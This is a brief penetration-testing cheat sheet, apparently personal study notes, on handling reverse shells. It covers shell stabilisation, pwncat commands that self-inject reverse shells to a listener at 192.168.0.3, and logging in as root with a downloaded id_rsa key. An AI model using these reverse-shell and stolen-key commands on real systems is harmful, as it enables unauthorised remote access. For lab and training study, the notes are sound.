#### Shell Stabilization
`We can use terminal commands like clear that is important after getting reverse shell.`

```export TERM=xterm```

##### Check available languages installed in System like python, perl, etc to get a better shell.

#### Backgrounding and Foregrounding Shell
```
Background CTRL+Z
Foreground : stty raw -echo; fg 
```

#### Pwncat

```
usage : pwncat -l 2000

Self-Inject Shell
pwncat -l 1234 --self-inject /bin/sh:192.168.0.3:1234
```
![Screenshot at 2022-12-19 11-47-20](https://user-images.githubusercontent.com/85208639/208359602-1d7531c9-5f7e-469a-802d-c3ee4c011e6a.png)

#### Connect Multiple Reverse Shells with Clients

```
pwncat -l 1234 --self-inject /bin/sh:192.168.0.3:1234+3
The above command creates 4 reverse shells on the machines at port 1235,1236,1237,1234

```

Sometimes we may gain remote machine ssh secret utilizing it we may be able to get access to it.

```
1) Download the id_rsa to local machine.
2) chmod 600 id_rsa
3) ssh -i id_rsa root@192.169.0.3
```
